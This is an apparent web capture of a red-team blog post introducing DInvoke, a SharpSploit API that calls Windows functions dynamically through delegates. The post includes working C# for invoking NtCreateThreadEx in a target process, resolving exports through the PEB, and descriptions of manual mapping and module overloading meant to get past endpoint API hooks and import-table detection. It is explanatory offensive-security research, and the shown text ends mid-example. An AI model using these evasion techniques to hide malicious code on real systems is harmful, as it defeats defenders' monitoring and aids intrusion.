@@ -1,0 +1,758 @@
+# https://thewover.github.io/Dynamic-Invoke/
+
+<!DOCTYPE html><html>
+
+  <body>
+    <div class="wrapper-masthead">
+      <div class="container">
+        
+      </div>
+    </div>
+
+    <div id="main" role="main" class="container">
+      <article class="post">
+  <h1>Emulating Covert Operations - Dynamic Invocation (Avoiding PInvoke &amp; API Hooks)</h1>
+
+  <div class="entry">
+    <p><em>TLDR: Presenting DInvoke, a new API in SharpSploit that acts as a dynamic replacement for PInvoke. Using it, we show how to dynamically invoke unmanaged code from memory or disk while avoiding API Hooking and suspicious imports.</em></p>
+
+<h1 id="dynamic-invocation---dinvoke">Dynamic Invocation - D/Invoke</h1>
+
+<p>Over the past few months, myself and b33f (@FuzzySec, Ruben Boonen) have quietly been adding an API to SharpSploit that helps you use unmanaged code from C# while avoiding suspicious P/Invokes. Rather than statically importing API calls with PInvoke, you may use Dynamic Invocation (I call it DInvoke) to load the DLL at runtime and call the function using a pointer to its location in memory. You may call arbitrary unmanaged code from memory (while passing parameters), allowing you to bypass API hooking in a variety of ways and execute post-exploitation payloads reflectively. This also avoids detections that look for imports of suspicious API calls via the Import Address Table in the .NET Assembly’s PE headers. Overall, DInvoke is intended to be a direct replacement for PInvoke that gives offensive tool developers great flexibility in how they can access and invoke unmanaged code.</p>
+
+<p>This blog post is the first in a three-part series detailing the features we have added to SharpSploit. We also presented on these subjects at Blue Hat IL 2020.</p>
+
+<ul>
+  <li>Blue Hat video: (https://youtu.be/FuxpMXTgV9s)</li>
+  <li>Presentation slides and materials: (https://github.com/FuzzySecurity/BlueHatIL-2020)</li>
+</ul>
+
+<p>It is important to note that nothing in this post or series represents a new fundamental technique. Every Technique that we implement has either been observed to be used by real threat actors in the wild before, discussed publicly by offensive security researchers, or is a variant of an already public Technique. And there is no exploit here. Just abuse of features and solid operational tradecraft.</p>
+
+<h2 id="background---pinvoke">Background - P/Invoke</h2>
+
+<p>Before we jump into the additions to SharpSploit, let’s talk about why we considered them to be necessary.</p>
+
+<p>.NET provides a mechanism called <a href="https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke">Platform Invoke (commonly known as P/Invoke)</a> that allows .NET applications to access data and APIs in unmanaged libraries (DLLs). By using P/Invoke, a C# developer may easily make calls to the standard Windows APIs. Offensive tool developers have taken advantage of this to craft .NET Assemblies (EXEs/DLLs) that leverage the power of both the managed and unmanaged Windows APIs to perform post-exploitation tradecraft. Since .NET Assemblies are relatively easy to load and execute from memory, this has enabled offensive operators to easily execute advanced post-exploitation tradecraft without dropping files to disk that could be detected by endpoint security tools.</p>
+
+<p>However, there are two significant disadvantages to relying on P/Invoke for offensive tools:
+1) Any reference to a Windows API call made through P/Invoke will result in a corresponding entry in the .NET Assembly’s Import Table. When your .NET Assembly is loaded, its Import Address Table will be updated with the addresses of the functions that you are calling. This is known as a “static” reference because the application does not need to actively locate the function before calling it. In contrast, a “dynamic” reference is when the application is designed to manually find the address of the function. As an example, if you use P/Invoke to call <code class="language-plaintext highlighter-rouge">kernel32!CreateRemoteThread</code> then your executable’s IAT will include a static reference to that function, telling everybody that it wants to perform the suspicious behavior of injecting code into a different process. Malware analysts and automated security tools commonly inspect the IAT of executables to learn about their behavior. If your executable is eventually analyzed by defenders (and it is safer to assume that it will be), then letting your API calls be referenced in the IAT is a quick win for the defender.
+2) If the endpoint security product running on the target machine is monitoring API calls (such as via API Hooking), then any calls made via P/Invoke may be detected by the product. This kind of monitoring is a very powerful mechanism for detecting malicious behavior in a process and can be used to develop high-fidelity detection analytics. It also has an inherent blocking capability that allows such products to <em>prevent</em> those API calls.</p>
+
+<p>As red teamers and offensive tool developers, we must be prepared to operate offensively in the face of an active defense. That means designing our tools to be reliable against mechanisms that defenders are using to catch and deter us. Therefore, any mechanism such as P/Invoke should be considered a single point of failure and should be eliminated if possible. This is why we created D/Invoke. To provide you with <em>options</em> not only in <em>what</em> you choose to execute on-target, but also in <em>how</em> you execute it.</p>
+
+<h2 id="delegates">Delegates</h2>
+
+<p>So what does DInvoke actually entail? Rather than using PInvoke to import the API calls that we want to use, we load a DLL into memory manually. This can be done using whatever mechanism you would prefer. Then, we get a pointer to a function in that DLL. We may call that function from the pointer while passing in our parameters.</p>
+
+<p>By leveraging this dynamic loading API rather than the static loading API that sits behind PInvoke, you avoid directly importing suspicious API calls into your .NET Assembly. Additionally, this API lets you easily invoke unmanaged code from memory in C# (passing in parameters and receiving output) without doing some hacky workaround like self-injecting shellcode.</p>
+
+<p>We accomplish this through the magic of <a href="https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/delegates/">Delegates</a>. .NET includes the Delegate API as a way of wrapping a method/function in a class. If you have ever used the Reflection API to enumerate methods in a class, the objects you were inspecting were actually a form of delegate.</p>
+
+<p>The Delegate API has a number of fantastic features, such as the ability to instantiate a Delegate from a pointer to a function and to dynamically invoke that function while passing in parameters.</p>
+
+<p>Let’s take a look at how DInvoke uses these Delegates:</p>
+
+<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="c1">/// &lt;summary&gt;</span>
+<span class="c1">/// Dynamically invoke an arbitrary function from a DLL, providing its name, function prototype, and arguments.</span>
+<span class="c1">/// &lt;/summary&gt;</span>
+<span class="c1">/// &lt;author&gt;The Wover (@TheRealWover)&lt;/author&gt;</span>
+<span class="c1">/// &lt;param name="DLLName"&gt;Name of the DLL.&lt;/param&gt;</span>
+<span class="c1">/// &lt;param name="FunctionName"&gt;Name of the function.&lt;/param&gt;</span>
+<span class="c1">/// &lt;param name="FunctionDelegateType"&gt;Prototype for the function, represented as a Delegate object.&lt;/param&gt;</span>
+<span class="c1">/// &lt;param name="Parameters"&gt;Parameters to pass to the function. Can be modified if function uses call by reference.&lt;/param&gt;</span>
+<span class="c1">/// &lt;returns&gt;Object returned by the function. Must be unmarshalled by the caller.&lt;/returns&gt;</span>
+<span class="k">public</span> <span class="k">static</span> <span class="kt">object</span> <span class="nf">DynamicAPIInvoke</span><span class="p">(</span><span class="kt">string</span> <span class="n">DLLName</span><span class="p">,</span> <span class="kt">string</span> <span class="n">FunctionName</span><span class="p">,</span> <span class="n">Type</span> <span class="n">FunctionDelegateType</span><span class="p">,</span> <span class="k">ref</span> <span class="kt">object</span><span class="p">[]</span> <span class="n">Parameters</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">IntPtr</span> <span class="n">pFunction</span> <span class="p">=</span> <span class="nf">GetLibraryAddress</span><span class="p">(</span><span class="n">DLLName</span><span class="p">,</span> <span class="n">FunctionName</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nf">DynamicFunctionInvoke</span><span class="p">(</span><span class="n">pFunction</span><span class="p">,</span> <span class="n">FunctionDelegateType</span><span class="p">,</span> <span class="k">ref</span> <span class="n">Parameters</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">/// &lt;summary&gt;</span>
+<span class="c1">/// Dynamically invokes an arbitrary function from a pointer. Useful for manually mapped modules or loading/invoking unmanaged code from memory.</span>
+<span class="c1">/// &lt;/summary&gt;</span>
+<span class="c1">/// &lt;author&gt;The Wover (@TheRealWover)&lt;/author&gt;</span>
+<span class="c1">/// &lt;param name="FunctionPointer"&gt;A pointer to the unmanaged function.&lt;/param&gt;</span>
+<span class="c1">/// &lt;param name="FunctionDelegateType"&gt;Prototype for the function, represented as a Delegate object.&lt;/param&gt;</span>
+<span class="c1">/// &lt;param name="Parameters"&gt;Arbitrary set of parameters to pass to the function. Can be modified if function uses call by reference.&lt;/param&gt;</span>
+<span class="c1">/// &lt;returns&gt;Object returned by the function. Must be unmarshalled by the caller.&lt;/returns&gt;</span>
+<span class="k">public</span> <span class="k">static</span> <span class="kt">object</span> <span class="nf">DynamicFunctionInvoke</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">FunctionPointer</span><span class="p">,</span> <span class="n">Type</span> <span class="n">FunctionDelegateType</span><span class="p">,</span> <span class="k">ref</span> <span class="kt">object</span><span class="p">[]</span> <span class="n">Parameters</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">Delegate</span> <span class="n">funcDelegate</span> <span class="p">=</span> <span class="n">Marshal</span><span class="p">.</span><span class="nf">GetDelegateForFunctionPointer</span><span class="p">(</span><span class="n">FunctionPointer</span><span class="p">,</span> <span class="n">FunctionDelegateType</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">funcDelegate</span><span class="p">.</span><span class="nf">DynamicInvoke</span><span class="p">(</span><span class="n">Parameters</span><span class="p">);</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>These two functions are the core of the DInvoke API. The second is the most important. It creates a Delegate from a function pointer and invokes the function wrapped by the delegate, passing in parameters provided by you. The parameters are passed in as an array of Objects so that you can pass in whatever data you need in whatever form. You must take care to ensure that the data passed in is structured in the way that the unmanaged code will expect.</p>
+
+<p>The confusing part of this is probably the <code class="language-plaintext highlighter-rouge">Type FunctionDelegateType</code> parameter. This is where you pass in the function prototype of the unmanaged code that you want to call. If you remember from PInvoke, you set up the function with something like:</p>
+
+<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
+<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">OpenProcess</span><span class="p">(</span>
+        <span class="n">ProcessAccessFlags</span> <span class="n">dwDesiredAccess</span><span class="p">,</span>
+        <span class="kt">bool</span> <span class="n">bInheritHandle</span><span class="p">,</span>
+        <span class="n">UInt32</span> <span class="n">dwProcessId</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<p>You must also pass in a function prototype for DInvoke. This lets the Delegate know how to set up the CPU registers and the stack when it invokes the function. If you compare this to how you would normally invoke unmanaged code from memory in C# (by self-injecting shellcode), this is MUCH easier!</p>
+
+<p>Defining a delegate works in a similar manner. You can define a delegate similar to how you would define a variable. Optionally, you can specify what calling convention to use when calling the function wrapped by the delegate.</p>
+
+<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="nf">UnmanagedFunctionPointer</span><span class="p">(</span><span class="n">CallingConvention</span><span class="p">.</span><span class="n">StdCall</span><span class="p">)]</span>
+<span class="k">public</span> <span class="k">delegate</span> <span class="n">UInt32</span> <span class="nf">NtOpenProcess</span><span class="p">(</span>
+    <span class="k">ref</span> <span class="n">IntPtr</span> <span class="n">ProcessHandle</span><span class="p">,</span>
+    <span class="n">Execute</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">Kernel32</span><span class="p">.</span><span class="n">ProcessAccessFlags</span> <span class="n">DesiredAccess</span><span class="p">,</span>
+    <span class="k">ref</span> <span class="n">Execute</span><span class="p">.</span><span class="n">Native</span><span class="p">.</span><span class="n">OBJECT_ATTRIBUTES</span> <span class="n">ObjectAttributes</span><span class="p">,</span>
+    <span class="k">ref</span> <span class="n">Execute</span><span class="p">.</span><span class="n">Native</span><span class="p">.</span><span class="n">CLIENT_ID</span> <span class="n">ClientId</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Once the Delegates are setup, they may be used to call arbitrary unmanaged code. For ease of use, there is a (growing) library of delegates and function wrappers for commonly used Windows NT/Win32 API calls. We also provide functions that load executables in a variety of ways, making it easier to execute their code covertly.</p>
+
+<h2 id="using-dinvoke">Using DInvoke</h2>
+
+<h3 id="executing-code">Executing Code</h3>
+
+<p>We are building a second set of function prototypes in SharpSploit. There is already a PInvoke library; we are now building a DInvoke library in the <code class="language-plaintext highlighter-rouge">SharpSploit.Execution.DynamicInvoke</code> namespace. The DInvoke library provides a managed wrapper function for each unmanaged function. The wrapper helps the user by ensuring that parameters are passed in correctly and the correct type of object is returned.</p>
+
+<p>It is worth noting: PInvoke is MUCH more forgiving about data types than DInvoke. If the data types you specify in a PInvoke function prototype are not <em>quite</em> right, it will silently correct them for you. With DInvoke, that is not the case. You must marshal data in <em>exactly</em> the correct way, ensuring that the data structures you pass in are in the same format and layout in memory as the unmanaged code expects. You must also specify the correct calling convention. This is annoying. And is part of why we created a seperate namespace for DInvoke signatures and wrappers. If you want to understand better how to marshal data for PInvoke/DInvoke, I would recommend reading @matterpreter’s <a href="https://posts.specterops.io/offensive-p-invoke-leveraging-the-win32-api-from-managed-code-7eef4fdef16d">blog post on the subject</a>.</p>
+
+<p>The code below demonstrates how DInvoke is used for the <code class="language-plaintext highlighter-rouge">NtCreateThreadEx</code> function in <code class="language-plaintext highlighter-rouge">ntdll.dll</code>. The delegate (that sets up the function prototype) is stored in the <code class="language-plaintext highlighter-rouge">SharpSploit.Execution.DynamicInvoke.Native.DELEGATES</code> struct. The wrapper method is <code class="language-plaintext highlighter-rouge">SharpSploit.Execution.DynamicInvoke.Native.NtCreateThreadEx</code> that takes all of the same parameters that you would expect to use in a normal PInvoke.</p>
+
+<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="k">namespace</span> <span class="nn">SharpSploit.Execution.DynamicInvoke</span>
+<span class="p">{</span>
+    <span class="c1">/// &lt;summary&gt;</span>
+    <span class="c1">/// Contains function prototypes and wrapper functions for dynamically invoking NT API Calls.</span>
+    <span class="c1">/// &lt;/summary&gt;</span>
+    <span class="k">public</span> <span class="k">class</span> <span class="nc">Native</span>
+    <span class="p">{</span>
+        <span class="k">public</span> <span class="k">static</span> <span class="n">Execute</span><span class="p">.</span><span class="n">Native</span><span class="p">.</span><span class="n">NTSTATUS</span> <span class="nf">NtCreateThreadEx</span><span class="p">(</span>
+            <span class="k">ref</span> <span class="n">IntPtr</span> <span class="n">threadHandle</span><span class="p">,</span>
+            <span class="n">Execute</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">WinNT</span><span class="p">.</span><span class="n">ACCESS_MASK</span> <span class="n">desiredAccess</span><span class="p">,</span>
+            <span class="n">IntPtr</span> <span class="n">objectAttributes</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">processHandle</span><span class="p">,</span>
+            <span class="n">IntPtr</span> <span class="n">startAddress</span><span class="p">,</span>
+            <span class="n">IntPtr</span> <span class="n">parameter</span><span class="p">,</span>
+            <span class="kt">bool</span> <span class="n">createSuspended</span><span class="p">,</span>
+            <span class="kt">int</span> <span class="n">stackZeroBits</span><span class="p">,</span>
+            <span class="kt">int</span> <span class="n">sizeOfStack</span><span class="p">,</span>
+            <span class="kt">int</span> <span class="n">maximumStackSize</span><span class="p">,</span>
+            <span class="n">IntPtr</span> <span class="n">attributeList</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="c1">// Craft an array for the arguments</span>
+            <span class="kt">object</span><span class="p">[]</span> <span class="n">funcargs</span> <span class="p">=</span>
+            <span class="p">{</span>
+                <span class="n">threadHandle</span><span class="p">,</span> <span class="n">desiredAccess</span><span class="p">,</span> <span class="n">objectAttributes</span><span class="p">,</span> <span class="n">processHandle</span><span class="p">,</span> <span class="n">startAddress</span><span class="p">,</span> <span class="n">parameter</span><span class="p">,</span> <span class="n">createSuspended</span><span class="p">,</span> <span class="n">stackZeroBits</span><span class="p">,</span>
+                <span class="n">sizeOfStack</span><span class="p">,</span> <span class="n">maximumStackSize</span><span class="p">,</span> <span class="n">attributeList</span>
+            <span class="p">};</span>
+
+            <span class="n">Execute</span><span class="p">.</span><span class="n">Native</span><span class="p">.</span><span class="n">NTSTATUS</span> <span class="n">retValue</span> <span class="p">=</span> <span class="p">(</span><span class="n">Execute</span><span class="p">.</span><span class="n">Native</span><span class="p">.</span><span class="n">NTSTATUS</span><span class="p">)</span><span class="n">Generic</span><span class="p">.</span><span class="nf">DynamicAPIInvoke</span><span class="p">(</span><span class="s">@"ntdll.dll"</span><span class="p">,</span> <span class="s">@"NtCreateThreadEx"</span><span class="p">,</span>
+                <span class="k">typeof</span><span class="p">(</span><span class="n">DELEGATES</span><span class="p">.</span><span class="n">NtCreateThreadEx</span><span class="p">),</span> <span class="k">ref</span> <span class="n">funcargs</span><span class="p">);</span>
+
+            <span class="c1">// Update the modified variables</span>
+            <span class="n">threadHandle</span> <span class="p">=</span> <span class="p">(</span><span class="n">IntPtr</span><span class="p">)</span><span class="n">funcargs</span><span class="p">[</span><span class="m">0</span><span class="p">];</span>
+
+            <span class="k">return</span> <span class="n">retValue</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">public</span> <span class="k">struct</span> <span class="nc">DELEGATES</span>
+        <span class="p">{</span>
+            <span class="p">[</span><span class="nf">UnmanagedFunctionPointer</span><span class="p">(</span><span class="n">CallingConvention</span><span class="p">.</span><span class="n">StdCall</span><span class="p">)]</span>
+            <span class="k">public</span> <span class="k">delegate</span> <span class="n">Execute</span><span class="p">.</span><span class="n">Native</span><span class="p">.</span><span class="n">NTSTATUS</span> <span class="nf">NtCreateThreadEx</span><span class="p">(</span>
+                <span class="k">out</span> <span class="n">IntPtr</span> <span class="n">threadHandle</span><span class="p">,</span>
+                <span class="n">Execute</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">WinNT</span><span class="p">.</span><span class="n">ACCESS_MASK</span> <span class="n">desiredAccess</span><span class="p">,</span>
+                <span class="n">IntPtr</span> <span class="n">objectAttributes</span><span class="p">,</span>
+                <span class="n">IntPtr</span> <span class="n">processHandle</span><span class="p">,</span>
+                <span class="n">IntPtr</span> <span class="n">startAddress</span><span class="p">,</span>
+                <span class="n">IntPtr</span> <span class="n">parameter</span><span class="p">,</span>
+                <span class="kt">bool</span> <span class="n">createSuspended</span><span class="p">,</span>
+                <span class="kt">int</span> <span class="n">stackZeroBits</span><span class="p">,</span>
+                <span class="kt">int</span> <span class="n">sizeOfStack</span><span class="p">,</span>
+                <span class="kt">int</span> <span class="n">maximumStackSize</span><span class="p">,</span>
+                <span class="n">IntPtr</span> <span class="n">attributeList</span><span class="p">);</span>
+        <span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>You may use this wrapper to dynamically call <code class="language-plaintext highlighter-rouge">NtCreateThreadEx</code> as if you were calling any other managed function:</p>
+
+<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">IntPtr</span> <span class="n">threadHandle</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">IntPtr</span><span class="p">();</span>
+
+<span class="c1">//Dynamically invoke NtCreateThreadEx to create a thread at the address specified in the target process.</span>
+<span class="n">result</span> <span class="p">=</span> <span class="n">DynamicInvoke</span><span class="p">.</span><span class="n">Native</span><span class="p">.</span><span class="nf">NtCreateThreadEx</span><span class="p">(</span><span class="k">ref</span> <span class="n">threadHandle</span><span class="p">,</span> <span class="n">Win32</span><span class="p">.</span><span class="n">WinNT</span><span class="p">.</span><span class="n">ACCESS_MASK</span><span class="p">.</span><span class="n">SPECIFIC_RIGHTS_ALL</span> <span class="p">|</span> <span class="n">Win32</span><span class="p">.</span><span class="n">WinNT</span><span class="p">.</span><span class="n">ACCESS_MASK</span><span class="p">.</span><span class="n">STANDARD_RIGHTS_ALL</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span>
+                    <span class="n">process</span><span class="p">.</span><span class="n">Handle</span><span class="p">,</span> <span class="n">baseAddr</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="n">suspended</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">);</span>
+
+<span class="c1">// The "threadHandle" variable will now be updated with a pointer to the handle for the new thread. </span>
+</code></pre></div></div>
+
+<p>You can, of course, manually use the Delegates in the DInvoke library without the use of our helper functions.</p>
+
+<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="c1">//Get a pointer to the NtCreateThreadEx function.</span>
+<span class="n">IntPtr</span> <span class="n">pFunction</span> <span class="p">=</span> <span class="n">Execution</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">.</span><span class="n">Generic</span><span class="p">.</span><span class="nf">GetLibraryAddress</span><span class="p">(</span><span class="s">@"ntdll.dll"</span><span class="p">,</span> <span class="s">"NtCreateThreadEx"</span><span class="p">);</span>
+
+<span class="c1">//Create an instance of a NtCreateThreadEx delegate from our function pointer.</span>
+<span class="n">DELEGATES</span><span class="p">.</span><span class="n">NtCreateThreadEx</span> <span class="n">createThread</span> <span class="p">=</span> <span class="p">(</span><span class="n">NATIVE_DELEGATES</span><span class="p">.</span><span class="n">NtCreateThreadEx</span><span class="p">)</span><span class="n">Marshal</span><span class="p">.</span><span class="nf">GetDelegateForFunctionPointer</span><span class="p">(</span>
+   <span class="n">pFunction</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="n">NATIVE_DELEGATES</span><span class="p">.</span><span class="n">NtCreateThreadEx</span><span class="p">));</span>
+
+<span class="c1">//Invoke NtCreateThreadEx using the delegate</span>
+<span class="nf">createThread</span><span class="p">(</span><span class="k">ref</span> <span class="n">threadHandle</span><span class="p">,</span> <span class="n">Win32</span><span class="p">.</span><span class="n">WinNT</span><span class="p">.</span><span class="n">ACCESS_MASK</span><span class="p">.</span><span class="n">SPECIFIC_RIGHTS_ALL</span> <span class="p">|</span> <span class="n">Win32</span><span class="p">.</span><span class="n">WinNT</span><span class="p">.</span><span class="n">ACCESS_MASK</span><span class="p">.</span><span class="n">STANDARD_RIGHTS_ALL</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span>
+                    <span class="n">process</span><span class="p">.</span><span class="n">Handle</span><span class="p">,</span> <span class="n">baseAddr</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="n">suspended</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h2 id="calling-modules">Calling Modules</h2>
+
+<h3 id="loading-code">Loading Code</h3>
+<p>The section above shows how you would use Delegates and the DInvoke API. But how do you obtain the address for a function in the first place? The answer to that question really is: <em>however you would like</em>. But, to make that process easier, we have provided a suite of tools to help you locate and call code using a variety of mechanisms.</p>
+
+<p>The easiest way to locate and execute a function is to use the <code class="language-plaintext highlighter-rouge">DynamicAPIInvoke</code> function shown above in the first code example. It uses <code class="language-plaintext highlighter-rouge">GetLibraryAddress</code> to locate a function.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">GetLibraryAddress</code>: First, checks if the module is already loaded using <code class="language-plaintext highlighter-rouge">GetLoadedModuleAddress</code>. If not, it loads the module into the process using <code class="language-plaintext highlighter-rouge">LoadModuleFromDisk</code>, which uses the NT API call <code class="language-plaintext highlighter-rouge">LdrLoadDll</code> to load the DLL. Either way, it then uses <code class="language-plaintext highlighter-rouge">GetExportAddress</code> to find the function in the module. Can take a string, an ordinal number, or a keyed hash as the identifier for the function you wish to call.</li>
+  <li><code class="language-plaintext highlighter-rouge">GetLoadedModuleAddress</code>: Uses <code class="language-plaintext highlighter-rouge">Process.GetCurrentProcess().Modules</code> to check if a module on disk is already loaded into the current process. If so, returns the address of that module.</li>
+  <li><code class="language-plaintext highlighter-rouge">LoadModuleFromDisk</code>: Loads a module from disk using the NT API call <code class="language-plaintext highlighter-rouge">LdrLoadDll</code>. This will generate an Image Load (“modload”) event for the process, which could be used as part of a detection signal.</li>
+  <li><code class="language-plaintext highlighter-rouge">GetExportAddress</code>: Starting from the base address of a module in memory, parses the PE headers of the module to locate a particular function. Can take a string, an ordinal number, or a hash as the identifier for the function you wish to call.</li>
+  <li><code class="language-plaintext highlighter-rouge">GetPebLdrModuleEntry</code>: Searches for the base address of a currently loaded module by searching for a reference to it in the PEB.</li>
+  <li><code class="language-plaintext highlighter-rouge">GetSyscallStub</code>: Maps a fresh copy of <code class="language-plaintext highlighter-rouge">ntdll.dll</code> and copies the bytes of a syscall wrapper from the fresh copy. This can be used to directly execute syscalls</li>
+</ul>
+
+<p>Additionally, we have provided several ways to load modules from memory rather than from disk.</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">MapModuleToMemory</code>: Manually maps a module into dynamically allocated memory, properly aligning the PE sections, correcting memory permissions, and fixing the Import Address Table. Can take either a byte array or the name of a file on disk.</li>
+  <li><code class="language-plaintext highlighter-rouge">MapModuleToMemoryAddress</code>: Manually maps a module that is already in memory (contained in a byte array), to a specific location in memory.</li>
+  <li><code class="language-plaintext highlighter-rouge">OverloadModule</code>: Uses Module Overloading to map a module into memory backed by a decoy DLL on disk. Chooses a random decoy DLL that is not already loaded, is signed, and exists in <code class="language-plaintext highlighter-rouge">%WINDIR%\System32</code>. Threads that execute code in the module will appear to be executing code from a legitimate DLL. Can take either a byte array or the name of a file on disk.</li>
+</ul>
+
+<h4 id="example---finding-exports">Example - Finding Exports</h4>
+
+<p>The example below demonstrates how to use these functions to find and call exports of a DLL.</p>
+
+<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="c1">///Author: b33f (@FuzzySec, Ruben Boonen)</span>
+<span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+
+<span class="k">namespace</span> <span class="nn">SpTestcase</span>
+<span class="p">{</span>
+    <span class="k">class</span> <span class="nc">Program</span>
+    <span class="p">{</span>
+
+        <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="c1">// Details</span>
+            <span class="n">String</span> <span class="n">testDetail</span> <span class="p">=</span> <span class="s">@"
+            #=================&gt;
+            # Hello there!
+            # I find things dynamically; base
+            # addresses and function pointers.
+            #=================&gt;
+            "</span><span class="p">;</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="n">testDetail</span><span class="p">);</span>
+
+            <span class="c1">// Get NTDLL base from the PEB</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[?] Resolve Ntdll base from the PEB.."</span><span class="p">);</span>
+            <span class="n">IntPtr</span> <span class="n">hNtdll</span> <span class="p">=</span> <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">.</span><span class="n">Generic</span><span class="p">.</span><span class="nf">GetPebLdrModuleEntry</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[&gt;] Ntdll base address : "</span> <span class="p">+</span> <span class="kt">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"{0:X}"</span><span class="p">,</span> <span class="n">hNtdll</span><span class="p">.</span><span class="nf">ToInt64</span><span class="p">())</span> <span class="p">+</span> <span class="s">"\n"</span><span class="p">);</span>
+
+            <span class="c1">// Search function by name</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[?] Specifying the name of a DLL (\"ntdll.dll\"), resolve a function by walking the export table in-memory.."</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[+] Search by name --&gt; NtCommitComplete"</span><span class="p">);</span>
+            <span class="n">IntPtr</span> <span class="n">pNtCommitComplete</span> <span class="p">=</span> <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">.</span><span class="n">Generic</span><span class="p">.</span><span class="nf">GetLibraryAddress</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">,</span> <span class="s">"NtCommitComplete"</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[&gt;] pNtCommitComplete : "</span> <span class="p">+</span> <span class="kt">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"{0:X}"</span><span class="p">,</span> <span class="n">pNtCommitComplete</span><span class="p">.</span><span class="nf">ToInt64</span><span class="p">())</span> <span class="p">+</span> <span class="s">"\n"</span><span class="p">);</span>
+
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[+] Search by ordinal --&gt; 0x260 (NtSetSystemTime)"</span><span class="p">);</span>
+            <span class="n">IntPtr</span> <span class="n">pNtSetSystemTime</span> <span class="p">=</span> <span class="n">SharpSploit</span><span class="p">.</span><span class="n">Execution</span><span class="p">.</span><span class="n">DynamicInvoke</span><span class="p">.</span><span class="n">Generic</span><span class="p">.</span><span class="nf">GetLibraryAddress</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">,</span> <span class="m">0x260</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[&gt;] pNtSetSystemTime : "</span> <span class="p">+</span> <span class="kt">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"{0:X}"</span><span class="p">,</span> <span class="n">pNtSetSystemTime</span><span class="p">.</span><span class="nf">ToInt64</span><span class="p">())</span> <span class="p">+</span> <span class="s">"\n"</span><span class="p">);</span>
+
